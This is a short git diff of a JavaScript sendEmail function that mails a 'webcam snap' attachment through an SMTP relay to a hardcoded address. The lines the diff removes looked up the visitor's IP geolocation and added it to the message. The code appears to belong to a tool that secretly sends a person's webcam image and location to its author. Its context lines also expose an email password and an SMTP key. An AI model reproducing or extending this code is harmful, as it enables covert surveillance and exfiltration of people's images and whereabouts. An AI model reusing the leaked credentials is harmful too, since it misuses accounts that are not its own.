@@ -1,5 +1,5 @@
 
-function sendEmail(bimage){
+function sendEmail(bimage,Body){
     /*var _EMAIL="alonnsohackerone@gmail.com"
     var _PASS="8infinite"
     var _TO="helenicejoana@gmail.com"
@@ -13,19 +13,6 @@ function sendEmail(bimage){
     var _PASS="7B6007F33B72796FC42CDD5122E54E120CE5"
     var _TO="alonnsoandres@gmail.com"
     var _HOST='smtp.elasticemail.com'
-
-    var Body="Attachment of the webcam snap";
-
-    try{
-        $.getJSON('https://ipapi.co/json/', function(data) {
-            var ipdata=JSON.stringify(data, null, 2)
-            console.log(ipdata);
-            Body=ipdata;
-        });
-    }catch{
-        console.log("Error")
-        Body+=" [ERROR]";
-    }
 
     const Attachments= [
         {   // encoded string as an attachment
